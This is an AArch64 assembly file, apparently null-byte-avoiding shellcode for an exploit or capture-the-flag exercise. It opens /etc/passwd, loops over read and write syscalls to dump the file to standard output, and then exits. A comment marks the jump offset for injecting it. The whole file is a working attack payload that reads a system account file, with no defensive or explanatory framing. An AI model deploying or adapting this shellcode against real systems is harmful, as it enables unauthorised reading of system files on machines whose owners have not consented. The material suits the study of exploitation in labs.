.section .text
.global _start

exit:
	mov x0, xzr
	mov x8, 0x5D // SYS_exit
	svc #0x1337
filename:
	.ascii "/etc/passwd"
	.byte 0xff
main:
	// openat(AT_FDCWD = 0, "/etc/passwd", O_RDONLY = 0)
	eor x0, xzr, xzr
	adr x1, filename
	eor x2, xzr, xzr
	strb w0, [x10, #-1]

	mov x8, #0x38 // SYS_openat
	svc #0x1337

	str x0, [sp, #-0x10] // save fd

	// read(fd, sp, 0x400)

	sub x1, sp, x2	
	read_chunk:
		mov x2, #0x400
		mov x8, #0x3f // SYS_read
		svc #0x1337

		str x0, [sp, #-0x18]
		ldr x2, [sp, #-0x18]
		cmp xzr, x2
		bge exit

		// write(1, sp, read_size)
		eor x0, xzr, #1
		mov x8, #0x40 // SYS_write
		svc #0x1337

		ldr x0, [sp, #-0x10]

		b read_chunk
	
// JUMP HERE (offset: 0x68 = 104)
_start:
	adr x10, main
	br x10

